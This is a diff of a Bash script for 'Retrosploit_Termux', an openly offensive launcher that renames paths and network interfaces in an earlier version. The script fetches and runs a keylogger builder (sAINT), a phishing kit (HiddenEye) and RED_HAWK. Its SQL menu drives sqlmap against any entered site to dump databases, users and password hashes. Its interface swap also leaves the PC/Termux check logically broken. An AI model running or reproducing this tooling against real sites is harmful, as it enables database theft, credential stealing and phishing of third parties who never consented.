@@ -38,8 +38,8 @@ public=`curl ifconfig.me 2>&-`
 
 version="1.0"
 auth="Retr0"
-mac=`</sys/class/net/eth0/address`
-logo=`figlet Retrosploit -f chunky.flf`
+mac=`</sys/class/net/wlan0/address`
+logo=`figlet Retrosploit_Termux -f chunky.flf`
 
 #=========== END MODULES ============#
 
@@ -48,10 +48,10 @@ echo -e $cyan && clear && sleep 0.5
 
 echo -e $cyan":: [ ${blink}Checking...${blinkre} ] ::\n"
 
-if [ -d ~/Retrosploit/functions ] && [ -d ~/Retrosploit/output ]; then
+if [ -d ~/Retrosploit_Termux/functions ] && [ -d ~/Retrosploit_Termux/output ]; then
 sleep 0.8
 else
-mkdir ~/Retrosploit/functions && mkdir ~/Retrosploit/output
+mkdir ~/Retrosploit_Termux/functions && mkdir ~/Retrosploit_Termux/output
 fi
 
 if [ -x "$(command -v figlet)" ]; then
@@ -194,7 +194,7 @@ apt-get install wpscan -y && sleep 0.8
 
 fi
 
-if [ -d ~/Retrosploit/functions/RED_HAWK ] && [ -f ~/Retrosploit/functions/RED_HAWK/rhawk.php ]; then
+if [ -d ~/Retrosploit_Termux/functions/RED_HAWK ] && [ -f ~/Retrosploit_Termux/functions/RED_HAWK/rhawk.php ]; then
 
 echo -e $reset"Red Hawk	${yellow}[ ${reset}FOUND ${yellow}]"
 sleep 0.8
@@ -204,11 +204,11 @@ else
 echo -e $reset"Red Hawk	${yellow}[ ${red}NOT FOUND ${yellow}]"
 sleep 0.8
 
-cd ~/Retrosploit/functions && git clone https://github.com/Tuhinshubhra/RED_HAWK.git && sleep 0.8
+cd ~/Retrosploit_Termux/functions && git clone https://github.com/Tuhinshubhra/RED_HAWK.git && sleep 0.8
 
 fi
 
-if [ -d ~/Retrosploit/functions/sAINT ] && [ -f ~/Retrosploit/functions/sAINT/sAINT.jar ]; then
+if [ -d ~/Retrosploit_Termux/functions/sAINT ] && [ -f ~/Retrosploit_Termux/functions/sAINT/sAINT.jar ]; then
 
 echo -e $reset"sAINT		${yellow}[ ${reset}FOUND ${yellow}]"
 sleep 0.8
@@ -218,11 +218,11 @@ else
 echo -e $reset"sAINT		${yellow}[ ${red}NOT FOUND ${yellow}]"
 sleep 0.8
 
-cd ~/Retrosploit/functions && git clone https://github.com/tiagorlampert/sAINT.git && apt-get install maven default-jdk default-jre openjdk-8-jdk openjdk-8-jre zlib1g-dev libncurses5-dev -y && cd sAINT && chmod +x configure.sh && ./configure.sh && sleep 0.8
+cd ~/Retrosploit_Termux/functions && git clone https://github.com/tiagorlampert/sAINT.git && apt-get install maven default-jdk default-jre openjdk-8-jdk openjdk-8-jre zlib1g-dev libncurses5-dev -y && cd sAINT && chmod +x configure.sh && ./configure.sh && sleep 0.8
 
 fi
 
-if [ -d ~/Retrosploit/functions/HiddenEye ] && [ -f ~/Retrosploit/functions/HiddenEye/HiddenEye.py ]; then
+if [ -d ~/Retrosploit_Termux/functions/HiddenEye ] && [ -f ~/Retrosploit_Termux/functions/HiddenEye/HiddenEye.py ]; then
 
 echo -e $reset"HiddenEye	${yellow}[ ${reset}FOUND ${yellow}]"
 sleep 0.8
@@ -232,11 +232,11 @@ else
 echo -e $reset"HiddenEye	${yellow}[ ${red}NOT FOUND ${yellow}]"
 sleep 0.8
 
-cd ~/Retrosploit/functions && git clone https://github.com/DarkSecDevelopers/HiddenEye.git && cd HiddenEye && pip3 install -r requirements.txt && sleep 0.8
+cd ~/Retrosploit_Termux/functions && git clone https://github.com/DarkSecDevelopers/HiddenEye.git && cd HiddenEye && pip3 install -r requirements.txt && sleep 0.8
 
 fi
 
-if [ -d /sys/class/net/eth0 ]; then
+if [ -d /sys/class/net/wlan0 ]; then
 
 echo -e $reset"You use PC	${yellow}[ ${reset}PC FOUND ${yellow}]"
 sleep 0.8
@@ -246,7 +246,7 @@ else
 echo -e $reset"You use Termux	${yellow}[ ${red}Termux FOUND ${yellow}]"
 sleep 0.8
 
-cd ~/Retrosploit/functions && git clone https://github.com/tiagorlampert/sAINT.git && cd sAINT && chmod +x configure.sh && ./configure.sh && sleep 0.8
+cd ~/Retrosploit_Termux/functions && git clone https://github.com/tiagorlampert/sAINT.git && cd sAINT && chmod +x configure.sh && ./configure.sh && sleep 0.8
 
 fi
 
@@ -301,7 +301,7 @@ help_module && sleep 1.3 && main_module
 
 elif [ $menu == "scan" ]; then
 sleep 0.5
-if [ -d /sys/class/net/eth0 ]; then
+if [ -d /sys/class/net/wlan0 ]; then
 scan_module
 else
 echo -e $red"This function is not work for termux. You should use pc for this." && sleep 0.8 && main_module
@@ -321,14 +321,14 @@ other_module
 
 elif [ $menu == "keylogger" ]; then
 
-cd ~/Retrosploit/functions/sAINT && java -jar sAINT.jar && sleep 0.8 && back_module
+cd ~/Retrosploit_Termux/functions/sAINT && java -jar sAINT.jar && sleep 0.8 && back_module
 
 elif [ $menu == "credit" ]; then
 sleep 0.1
 
 echo -e $red":: ${cyan}Credits ${red}::\n"
 
-echo -e $reset"Me	-	Retrosploit"
+echo -e $reset"Me	-	Retrosploit_Termux"
 sleep 0.8
 echo -e "Sqlmapproject	-	Sqlmap"
 sleep 0.8
@@ -353,7 +353,7 @@ clear && logo && main_module
 elif [ $menu == "tor" ]; then
 sleep 0.3
 
-if [ -d /sys/class/net/eth0 ]; then
+if [ -d /sys/class/net/wlan0 ]; then
 
 sleep 0.3
 tor_module
@@ -473,7 +473,7 @@ back_module
 
 elif [ $menu == "rhawk" ]; then
 
-php ~/Retrosploit/functions/RED_HAWK/rhawk.php && sleep 0.8 && main_module
+php ~/Retrosploit_Termux/functions/RED_HAWK/rhawk.php && sleep 0.8 && main_module
 
 elif [ $menu == "back" ]; then
 
@@ -548,14 +548,14 @@ if [ $menu == "help" ]; then
 
 other_module
 
-elif [ -d ~/Retrosploit/functions/HiddenEye ]; then
+elif [ -d ~/Retrosploit_Termux/functions/HiddenEye ]; then
 sleep 0.1
 
 echo -e $red"This function is not work for termux. You should use pc for this." && sleep 0.8 && main_module
 
 else
 
-cd ~/Retrosploit/functions/HiddenEye && python3 HiddenEye.py && sleep 0.8 && main_module
+cd ~/Retrosploit_Termux/functions/HiddenEye && python3 HiddenEye.py && sleep 0.8 && main_module
 
 fi
 
@@ -718,18 +718,18 @@ help_module
 elif [ $switch == "ssql" ]; then
 
 read -p "retrosploit >> sql >> target's site :> " target
-sqlmap -u $target --dbs --batch --output-dir=~/Retrosploit/output/
+sqlmap -u $target --dbs --batch --output-dir=~/Retrosploit_Termux/output/
 sleep 0.5
 read -p "retrosploit >> sql >> target >> tables :> " tables
-sqlmap -u $target -D $tables --tables --batch --output-dir=~/Retrosploit/output/
+sqlmap -u $target -D $tables --tables --batch --output-dir=~/Retrosploit_Termux/output/
 sleep 0.5
 read -p "retrosploit >> sql >> target >> tables >> columns :> " columns
-sqlmap -u $target --columns -D $tables -T $columns --batch --output-dir=~/Retrosploit/output/
+sqlmap -u $target --columns -D $tables -T $columns --batch --output-dir=~/Retrosploit_Termux/output/
 sleep 0.5
 read -p "retrosploit >> sql >> target >> tables >> columns >> dump :> " dump
 
 if [ $dump == "y" ] || [ $dump == "Y" ]; then
-sqlmap -u $target --dump -D $tables -T $columns --batch --output-dir=~/Retrosploit/output/
+sqlmap -u $target --dump -D $tables -T $columns --batch --output-dir=~/Retrosploit_Termux/output/
 sleep 0.5
 back_module
 
@@ -752,14 +752,14 @@ sqlmap -g $dork --batch
 elif [ $switch == "dbuser" ]; then
 sleep 0.1
 read -p "retrosploit >> sql >> target's site :> " target
-sqlmap -u $target --users --batch --output-dir=~/Retrosploit/output/
+sqlmap -u $target --users --batch --output-dir=~/Retrosploit_Termux/output/
 sleep 0.5
 back_module
 
 elif [ $switch == "dbpwd" ]; then
 sleep 0.1
 read -p "retrosploit >> sql >> target's site :> " target
-sqlmap -u $target --passwords --batch --output-dir=~/Retrosploit/output/
+sqlmap -u $target --passwords --batch --output-dir=~/Retrosploit_Termux/output/
 sleep 0.5
 back_module
 
@@ -820,4 +820,3 @@ fi
 }
 
 check_module
-
